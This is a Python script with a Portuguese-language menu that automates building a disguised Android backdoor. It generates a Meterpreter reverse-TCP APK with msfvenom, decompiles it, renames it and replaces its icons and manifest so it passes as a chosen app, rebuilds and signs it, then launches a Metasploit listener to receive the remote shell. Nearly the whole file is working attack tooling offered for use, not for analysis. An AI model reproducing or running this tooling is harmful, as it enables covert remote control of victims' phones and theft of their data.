import os
import sys

print("\n")
print("\033[1;32m ::::::::::        ::::    :::   ::::::::::::::\033[0;0m")
print("\033[1;32m       :+:        :+:+:   :+:        :+:  	 	\033[0;0m")
print("\033[1;32m      +:+        :+:+:+  +:+        +:+   	  	\033[0;0m")
print("\033[1;32m     +#+        +#+ +:+ +#+        +#+    	   	\033[0;0m")
print("\033[1;32m    +#+        +#+  +#+#+#        +#+     	 	\033[0;0m")
print("\033[1;32m   #+#        #+#   #+#+#        #+#     		\033[0;0m")
print("\033[1;32m  #########  ###    ####        ###       		\033[0;0m")
print("\n")

print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
print("\033[1;32m║ [1]criar payload  ? :\033[0;0m")
print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
print("\033[1;32m║ [2]Sair ? :\033[0;0m")
print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

criar = "1"
sair = "2"

x = input("\033[1;32m Exemplo Opção [1] : \033[0;0m")

os.system("clear")

if x == '1':

	print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
	nome = input("\033[1;32m║ Digite nome do app : \033[0;0m")
	print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

	print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
	ip = input("\033[1;32m║ Digite ip : \033[0;0m")
	print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

	print("\033[1;32m╔═══════════════════════════════╗\033[0;0m")
	porta = input("\033[1;32m║ Digite porta : \033[0;0m")
	print("\033[1;32m╚═══════════════════════════════╝\033[0;0m")

	fp = open("msf.rc", "w")
	fp.write(f"""
	clear
	msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} R > {nome}.apk
	apktool d {nome}.apk -o APK
	rm -rf {nome}.apk
	cp -r /home/znt/projeto-pyload/drawable-hdpi-v4 /home/znt/projeto-pyload/APK/res
	cd /home/znt/projeto-pyload/APK/res/values
	rm -rf public.xml
	cat strings.xml | sed 's/MainActivity/{nome}/g' > strings && mv strings strings.xml
	cd /home/znt/projeto-pyload/
	cp -r /home/znt/projeto-pyload/public.xml /home/znt/projeto-pyload/APK/res/values
	cd /home/znt/projeto-pyload/APK
	rm -rf AndroidManifest.xml
	cp -r /home/znt/projeto-pyload/AndroidManifest.xml /home/znt/projeto-pyload/APK
	cd /home/znt/projeto-pyload/
	apktool b APK/ -o {nome}.apk
	d2j-apk-sign {nome}.apk
	rm -rf {nome}.apk
	use multi/handler
	set payload android/meterpreter/reverse_tcp
	set lhost 127.0.0.1
	set lport 8888
	clear
	exploit
	""")

	fp.close()

	os.system("msfconsole -r msf.rc")

elif x == '2':
	pass